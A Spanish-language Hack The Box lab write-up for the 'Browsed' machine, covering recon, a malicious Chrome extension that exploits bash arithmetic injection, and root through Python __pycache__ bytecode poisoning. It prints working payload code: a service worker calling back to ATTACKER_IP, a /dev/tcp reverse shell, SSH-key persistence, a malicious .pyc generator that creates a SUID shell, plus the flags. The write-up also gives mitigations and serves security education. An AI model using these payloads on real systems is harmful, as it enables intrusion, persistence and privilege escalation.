# HTB - Browsed (Medium)

**IP:** <TARGET_IP>
**OS:** Ubuntu 24.04.3 LTS
**Dificultad:** Medium
**Fecha:** 2026-02-17

---

## Resumen Ejecutivo

| Fase | Técnica | Resultado |
|------|---------|-----------|
| Reconocimiento | Nmap, enumeración web | Nginx con upload de extensiones Chrome + Gitea 1.24.5 interno |
| Foothold | Malicious Chrome Extension + Bash Arithmetic Eval Injection | Shell como `larry` |
| Privesc | Python `__pycache__` Poisoning via sudo tool | Root |

---

## 1. Reconocimiento

### Nmap

```bash
nmap -sC -sV -p- <TARGET_IP> -T4 --min-rate=1000
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14
80/tcp open  http    nginx 1.24.0 (Ubuntu)
```

Solo 2 puertos abiertos: SSH y HTTP.

### Enumeración Web (Puerto 80)

La página principal es un sitio estático de una empresa llamada "Browsed" que desarrolla extensiones de navegador. Puntos clave:

- **`/upload.php`** - Formulario para subir extensiones de Chrome en formato ZIP
- **`/samples.html`** - Extensiones de ejemplo descargables (Fontify, ReplaceImages, Timer)
- El sitio indica que los desarrolladores **probarán las extensiones subidas** en su navegador

```bash
curl -s http://<TARGET_IP>/ | grep -i 'extension\|upload\|chrome'
```

> *"People can share their chrome version 134 based extension with us, and we'll try them out for some time!"*
> *"To send us an extension, visit the upload page to upload your chrome extension, in zip format. Make sure your files are directly inside the archive, and not in a folder!"*

### Análisis del Output de Chrome

Al subir una extensión válida, el servidor ejecuta Chrome headless y devuelve los logs. Del output se extraen datos críticos:

```
timeout 10s xvfb-run /opt/chrome-linux64/chrome --disable-gpu --no-sandbox \
  --load-extension="/tmp/extension_XXX" \
  --enable-logging=stderr --v=1 \
  http://localhost/ http://browsedinternals.htb
```

**Hallazgos clave del log de Chrome:**

| Dato | Valor | Significado |
|------|-------|-------------|
| Usuario del proceso | `www-data` | Chrome corre con permisos www-data |
| Perfil Chrome | `/var/www/.config/google-chrome-for-testing/` | Confirma usuario www-data |
| URLs visitadas | `http://localhost/` y `http://browsedinternals.htb` | Chrome navega a 2 sitios |
| Extensión cargada | `/tmp/extension_XXX/` | Nuestra extensión se inyecta |
| Content Script | ID `gljbgmkfdhjoocncbblcdgciaeflidlj` | Se inyecta en las páginas |
| Timeout | 10 segundos | Chrome se mata después de 10s |
| Gitea detectado | Assets `index.css?v=1.24.5`, `index.js?v=1.24.5` | **Gitea 1.24.5** en browsedinternals.htb |

### Hosts

```bash
echo "<TARGET_IP> browsed.htb browsedinternals.htb" >> /etc/hosts
```

### Enumeración de Gitea (browsedinternals.htb)

Gitea 1.24.5 accesible externamente a través de nginx (puerto 80). No requiere autenticación para registro.

```bash
# Usuarios públicos
curl -s "http://browsedinternals.htb/explore/users"
# → Usuario: larry

# Repos públicos
curl -s "http://browsedinternals.htb/api/v1/repos/search?limit=50"
# → Repo: larry/MarkdownPreview (Python)
```

**Registro de cuenta propia en Gitea:**

```bash
CSRF=$(curl -s -c cookies.txt "http://browsedinternals.htb/user/sign_up" | \
  grep -oP 'name="_csrf" value="\K[^"]+')

curl -b cookies.txt -c cookies.txt -X POST "http://browsedinternals.htb/user/sign_up" \
  -d "_csrf=$CSRF&user_name=hacker123&email=hacker123@test.com&password=Hacker123!&retype=Hacker123!"
```

### Análisis del Repo MarkdownPreview

Estructura del repositorio:

```
larry/MarkdownPreview/
├── README.md
├── app.py          ← Flask app (Markdown Previewer)
├── routines.sh     ← Script bash con inyección
├── backups/
├── files/
└── log/
```

**`app.py` - Flask Application (localhost:5000):**

```python
from flask import Flask, request, send_from_directory, redirect
import markdown, subprocess

@app.route('/routines/<rid>')
def routines(rid):
    # Llama al script bash con el input del usuario
    subprocess.run(["./routines.sh", rid])  # ← Sin shell=True, pero...
    return "Routine executed !"

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000)  # Solo accesible desde localhost
```

**`routines.sh` - Script Vulnerable:**

```bash
#!/bin/bash

if [[ "$1" -eq 0 ]]; then       # ← VULNERABLE: Bash Arithmetic Evaluation
  # Routine 0: Clean temp files
  ...
elif [[ "$1" -eq 1 ]]; then     # ← VULNERABLE
  # Routine 1: Backup data
  ...
elif [[ "$1" -eq 2 ]]; then     # ← VULNERABLE
  ...
fi
```

**La vulnerabilidad:** En bash, `[[ "$1" -eq 0 ]]` evalúa `$1` como una expresión aritmética. Si `$1` contiene `a[$(command)]`, bash ejecuta la sustitución de comandos `$(command)` durante la evaluación aritmética.

**Restricciones:**
1. `subprocess.run(["./routines.sh", rid])` usa lista (sin shell injection directa)
2. Flask está en `localhost:5000`, solo accesible internamente
3. La ruta Flask `<rid>` no acepta `/` (path separator)
4. Chrome tiene timeout de 10 segundos

---

## 2. Foothold - Chrome Extension Maliciosa

### Estrategia

1. Crear extensión Chrome con **background service worker** (Manifest V3)
2. El service worker NO tiene restricciones CORS → puede hacer fetch a `localhost:5000`
3. Explotar la **Bash Arithmetic Evaluation Injection** en `/routines/<rid>`
4. Usar base64 para evitar el carácter `/` en la URL de Flask
5. Obtener reverse shell como `larry`

### Paso 1: Descargar Extensión de Ejemplo

```bash
curl -sO http://<TARGET_IP>/fontify.zip
mkdir fontify_sample && cd fontify_sample && unzip ../fontify.zip
```

Estructura original:
```
fontify/
├── manifest.json
├── content.js
├── popup.html
├── popup.js
└── style.css
```

### Paso 2: Modificar manifest.json

Se agrega `host_permissions` para `<all_urls>` y un `background` service worker:

```json
{
  "manifest_version": 3,
  "name": "Font Switcher",
  "version": "2.0.0",
  "description": "Choose a font to apply to all websites!",
  "permissions": ["storage", "scripting"],
  "host_permissions": ["<all_urls>"],
  "action": {
    "default_popup": "popup.html",
    "default_title": "Choose your font"
  },
  "background": {
    "service_worker": "background.js"
  },
  "content_scripts": [
    {
      "matches": ["<all_urls>"],
      "js": ["content.js"],
      "run_at": "document_start"
    }
  ]
}
```

**¿Por qué un Service Worker?**

Los content scripts están sujetos a CORS (Same-Origin Policy). Un content script en `browsedinternals.htb` NO puede hacer XHR a `localhost:5000`. Sin embargo, el **background service worker** con `host_permissions: ["<all_urls>"]` puede hacer fetch a CUALQUIER URL sin restricciones CORS.

### Paso 3: Crear background.js (Payload Principal)

```javascript
const EXFIL = "http://ATTACKER_IP:8888";

// Notificar que estamos vivos
fetch(EXFIL + "/bg-alive").catch(() => {});

// Test: ¿Flask es accesible?
fetch("http://localhost:5000/").then(r => r.text()).then(t => {
  fetch(EXFIL + "/flask-reachable", {method: "POST", body: t});
}).catch(e => {
  fetch(EXFIL + "/flask-unreachable", {method: "POST", body: String(e)});
});

// === PAYLOAD: Bash Arithmetic Injection con Reverse Shell ===
// Comando original: bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
// Codificado en Base64 para evitar / en la URL de Flask
// Payload final: a[$(echo BASE64_STRING|base64 -d|bash)]

var b64shell = "a%5B%24(echo%20BASE64_ENCODED_REVSHELL%7Cbase64%20-d%7Cbash)%5D";
fetch("http://localhost:5000/routines/" + b64shell).catch(() => {});

// === PAYLOAD: SSH Key para persistencia ===
var sshCmd = "mkdir -p ~/.ssh && echo 'SSH_PUBLIC_KEY' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys && chmod 700 ~/.ssh";
var sshB64 = btoa(sshCmd);
var sshPayload = "a[$(echo " + sshB64 + "|base64 -d|bash)]";
fetch("http://localhost:5000/routines/" + encodeURIComponent(sshPayload)).catch(() => {});
```

**Desglose del payload:**

```
URL: http://localhost:5000/routines/a[$(echo B64_STRING|base64 -d|bash)]

Flask decodifica → rid = "a[$(echo B64_STRING|base64 -d|bash)]"

subprocess.run(["./routines.sh", rid])
  → routines.sh recibe $1 = "a[$(echo B64_STRING|base64 -d|bash)]"

[[ "$1" -eq 0 ]]
  → Bash evalúa aritméticamente: a[$(echo ...|base64 -d|bash)]
  → Ejecuta: echo B64_STRING | base64 -d | bash
  → Decodifica a: bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
  → ¡REVERSE SHELL!
```

**¿Por qué base64?** La ruta Flask `<rid>` no acepta `/`. El comando de reverse shell contiene `/dev/tcp` con barras. Al codificarlo en base64, las barras quedan dentro del string base64 (datos, no path separators). El comando `echo ...|base64 -d|bash` no contiene `/` en sí mismo.

### Paso 4: Empaquetar y Subir

```bash
# Generar clave SSH
ssh-keygen -t ed25519 -f htb_key -N ""

# Empaquetar extensión
zip -j malicious.zip manifest.json content.js popup.html popup.js style.css background.js

# Iniciar listener
python3 listener.py &   # HTTP en puerto 8888
nc -lvnp 4444 &         # Reverse shell en puerto 4444

# Subir extensión (IMPORTANTE: type=application/zip)
curl -X POST -F "extension=@malicious.zip;type=application/zip" http://<TARGET_IP>/upload.php
```

**Nota:** El `Content-Type: application/zip` es obligatorio. Sin él, el servidor rechaza con "Invalid file type or size."

### Paso 5: Recibir Callbacks

```
[+] GET /bg-alive                    ← Service worker activo
[+] POST /flask-reachable            ← Flask en localhost:5000 confirmado
[+] POST /ssh-resp → "Routine executed !"  ← SSH key inyectada
```

### Paso 6: Acceso SSH como Larry

```bash
ssh -i htb_key larry@<TARGET_IP>

larry@browsed:~$ id
uid=1000(larry) gid=1000(larry) groups=1000(larry)

larry@browsed:~$ cat ~/user.txt
82f1cb6a4b37420fa9f4964eb1d52066
```

### User Flag: `82f1cb6a4b37420fa9f4964eb1d52066`

---

## 3. Escalada de Privilegios - Python __pycache__ Poisoning

### Enumeración

```bash
larry@browsed:~$ sudo -l
User larry may run the following commands on browsed:
    (root) NOPASSWD: /opt/extensiontool/extension_tool.py
```

### Análisis del Tool

**`/opt/extensiontool/extension_tool.py`:**

```python
#!/usr/bin/python3.12
import json
import os
from argparse import ArgumentParser
from extension_utils import validate_manifest, clean_temp_files  # ← Import local
import zipfile

EXTENSION_DIR = '/opt/extensiontool/extensions/'

def main():
    parser = ArgumentParser(...)
    parser.add_argument('--ext', type=str, default='.', help='Which extension to load')
    parser.add_argument('--bump', choices=['major', 'minor', 'patch'])
    parser.add_argument('--zip', type=str, nargs='?', const='extension.zip')
    parser.add_argument('--clean', action='store_true')

    args = parser.parse_args()
    args.ext = os.path.basename(args.ext)
    if not (args.ext in os.listdir(EXTENSION_DIR)):
        print(f"[X] Use one of the following extensions : {os.listdir(EXTENSION_DIR)}")
        exit(1)

    manifest_data = validate_manifest(manifest_path)
    # ...
```

**`/opt/extensiontool/extension_utils.py`:**

```python
import os, json, subprocess, shutil
from jsonschema import validate, ValidationError

def validate_manifest(path):
    with open(path, 'r', encoding='utf-8') as f:
        data = json.load(f)
    validate(instance=data, schema=MANIFEST_SCHEMA)
    return data
```

### Permisos del Directorio

```bash
ls -la /opt/extensiontool/
drwxr-xr-x  root root  .
-rwxrwxr-x  root root  extension_tool.py
-rw-rw-r--  root root  extension_utils.py     # ← NO writable por larry
drwxrwxrwx  root root  __pycache__            # ← WRITABLE POR TODOS (777)
drwxrwxr-x  root root  extensions/
```

### La Vulnerabilidad: __pycache__ Poisoning

Cuando Python importa un módulo, sigue este orden:

1. Busca `__pycache__/modulo.cpython-312.pyc`
2. Si existe y los metadatos coinciden con el source → **usa el .pyc cacheado**
3. Si no coincide → recompila desde el source `.py`

Los metadatos que valida son:
- **Magic number** de Python 3.12
- **Timestamp** del archivo source original
- **Tamaño** del archivo source original

Como `__pycache__/` es world-writable (777), podemos crear un `.pyc` malicioso que Python cargará como root cuando se ejecute con sudo.

### Explotación

**Paso 1: Obtener metadatos del source original:**

```bash
stat /opt/extensiontool/extension_utils.py
# Size: 1245
# Modify: 2025-03-23 10:56:19 UTC  →  Unix timestamp: 1742727379

python3.12 -c "import importlib.util; print(importlib.util.MAGIC_NUMBER.hex())"
# cb0d0d0a
```

**Paso 2: Generar .pyc malicioso EN EL TARGET (importante usar Python 3.12):**

Se crea un script Python que genera el bytecode malicioso con los headers correctos:

```python
# EJECUTAR EN EL TARGET con python3.12
import struct, marshal, importlib.util

magic = importlib.util.MAGIC_NUMBER  # cb0d0d0a (Python 3.12)
source_timestamp = 1742727379        # 2025-03-23 10:56:19 UTC
source_size = 1245                   # Tamaño original del .py

malicious_source = '''
import os, json, shutil

# ========== PAYLOAD: Crear SUID bash + SSH key para root ==========
os.system("cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash")
os.system("mkdir -p /root/.ssh")
# ... escribir SSH key a /root/.ssh/authorized_keys ...

# Funciones originales para que el script no falle
def validate_manifest(path):
    with open(path, 'r', encoding='utf-8') as f:
        data = json.load(f)
    print("[+] Manifest is valid.")
    return data

def clean_temp_files(extension_dir):
    temp_dir = '/opt/extensiontool/temp'
    if os.path.exists(temp_dir):
        shutil.rmtree(temp_dir)
    exit(0)
'''

code = compile(malicious_source, "extension_utils.py", "exec")
flags = 0
header = magic + struct.pack("<III", flags, source_timestamp, source_size)
data = header + marshal.dumps(code)

with open("/opt/extensiontool/__pycache__/extension_utils.cpython-312.pyc", "wb") as f:
    f.write(data)
```

> **IMPORTANTE:** El .pyc DEBE compilarse con la misma versión de Python del target (3.12). Si se compila con otra versión (ej: 3.13), el bytecode es incompatible aunque se cambie el magic number manualmente.

**Estructura del archivo .pyc:**

```
Offset  Size  Campo
0x00    4     Magic Number (cb0d0d0a para Python 3.12)
0x04    4     Flags (0x00000000 = timestamp-based validation)
0x08    4     Source Timestamp (little-endian, debe coincidir con el .py)
0x0C    4     Source Size (little-endian, debe coincidir con el .py)
0x10    ...   Marshalled Code Object (nuestro código malicioso)
```

**Paso 3: Ejecutar el tool con sudo:**

```bash
sudo /opt/extensiontool/extension_tool.py --ext Fontify --bump patch
```

Python importa `extension_utils`:
1. Encuentra `__pycache__/extension_utils.cpython-312.pyc`
2. Verifica magic = `cb0d0d0a` ✓
3. Verifica timestamp = `1742727379` ✓
4. Verifica size = `1245` ✓
5. **Carga nuestro código malicioso como root** ✓

**Paso 4: Obtener root:**

```bash
ls -la /tmp/rootbash
# -rwsr-xr-x 1 root root 1446024 Feb 17 22:49 /tmp/rootbash

/tmp/rootbash -p
# uid=1000(larry) gid=1000(larry) euid=0(root)

cat /root/root.txt
# c3a088c7cd6a9760fd4da0e8a156de26
```

### Root Flag: `c3a088c7cd6a9760fd4da0e8a156de26`

---

## 4. Diagrama de Ataque

```
┌─────────────────────────────────────────────────────────────────┐
│                        ATACANTE (Kali)                          │
│  - HTTP Listener :8888                                          │
│  - NC Listener :4444                                            │
│  - SSH Key generada                                             │
└────────────────────┬────────────────────────────────────────────┘
                     │
         ┌───────────▼───────────┐
         │   1. Upload .zip      │
         │   (extensión Chrome)  │
         └───────────┬───────────┘
                     │
┌────────────────────▼────────────────────────────────────────────┐
│                      TARGET (<TARGET_IP>)                        │
│                                                                 │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │ Nginx :80                                                │   │
│  │  ├── Sitio estático (HTML5 UP)                           │   │
│  │  ├── upload.php → Ejecuta Chrome headless                │   │
│  │  └── Proxy → Gitea :3000                                 │   │
│  └──────────────────────┬───────────────────────────────────┘   │
│                         │                                       │
│  ┌──────────────────────▼───────────────────────────────────┐   │
│  │ Chrome Headless (www-data)                               │   │
│  │  ├── Carga nuestra extensión                             │   │
│  │  ├── Visita http://localhost/                            │   │
│  │  └── Visita http://browsedinternals.htb/                 │   │
│  │                                                          │   │
│  │  Service Worker (sin CORS):                              │   │
│  │  └── fetch("http://localhost:5000/routines/PAYLOAD")     │   │
│  └──────────────────────┬───────────────────────────────────┘   │
│                         │                                       │
│  ┌──────────────────────▼───────────────────────────────────┐   │
│  │ Flask App :5000 (larry)                                  │   │
│  │  └── /routines/<rid>                                     │   │
│  │       └── subprocess.run(["./routines.sh", rid])         │   │
│  │            └── [[ "$1" -eq 0 ]]                          │   │
│  │                 └── Bash Arithmetic Eval                 │   │
│  │                      └── a[$(echo B64|base64 -d|bash)]   │   │
│  │                           └── REVERSE SHELL → larry      │   │
│  └──────────────────────────────────────────────────────────┘   │
│                                                                 │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │ Privesc: sudo extension_tool.py                          │   │
│  │  └── from extension_utils import ...                     │   │
│  │       └── Loads __pycache__/extension_utils...pyc        │   │
│  │            └── NUESTRO .pyc MALICIOSO                    │   │
│  │                 └── Crea SUID /tmp/rootbash              │   │
│  │                      └── ROOT                            │   │
│  └──────────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────────┘
```

---

## 5. Lecciones Aprendidas

### Errores durante la explotación

| Error | Causa | Solución |
|-------|-------|----------|
| "Invalid file type or size" al subir | Faltaba `Content-Type: application/zip` | Usar `-F "extension=@file.zip;type=application/zip"` en curl |
| Content script no podía acceder a localhost:5000 | CORS bloquea XHR cross-origin | Usar **background service worker** con `host_permissions` |
| Flask devolvía 404 con payloads | El carácter `/` en el payload se interpreta como path separator | Codificar el comando en **base64** para evitar `/` |
| .pyc malicioso no ejecutaba código | Compilado con Python 3.13, target usa 3.12 | Compilar **directamente en el target** con `python3.12` |
| Reverse shell moría en 10 segundos | Chrome se mata con `timeout 10s` | Inyectar **SSH key** para acceso persistente |

### Conceptos Clave

1. **Manifest V3 Service Workers:** A diferencia de content scripts, los service workers de extensiones Chrome con `host_permissions` pueden hacer requests a cualquier origen sin restricciones CORS.

2. **Bash Arithmetic Evaluation Injection:** Cuando bash evalúa una expresión aritmética (con `-eq`, `$(( ))`, `let`, etc.), las sustituciones de comandos (`$(cmd)`) dentro de la expresión se ejecutan. Esto es una feature documentada de bash, no un bug.

3. **Python __pycache__ Poisoning:** Python confía en los archivos `.pyc` cacheados si los metadatos del header (magic, timestamp, size) coinciden con el source. Si el directorio `__pycache__` es writable, un atacante puede reemplazar el bytecode compilado con código malicioso.

---

## 6. Mitigaciones

| Vulnerabilidad | Mitigación |
|----------------|------------|
| Extensiones Chrome sin sandbox | No ejecutar extensiones de usuarios no confiables, o usar perfiles aislados |
| Bash Arithmetic Eval | Usar `case` en vez de `[[ -eq ]]`, o validar que el input sea numérico: `[[ "$1" =~ ^[0-9]+$ ]]` |
| Flask sin validación | Validar que `rid` sea un entero antes de pasarlo al script |
| __pycache__ writable | Establecer permisos `755` en `__pycache__/` (solo root puede escribir) |
| sudo sin restricciones | Usar `PYTHONDONTWRITEBYTECODE=1` y/o verificar integridad de los módulos |

---

## 7. Flags

```
User: 82f1cb6a4b37420fa9f4964eb1d52066
Root: c3a088c7cd6a9760fd4da0e8a156de26
```
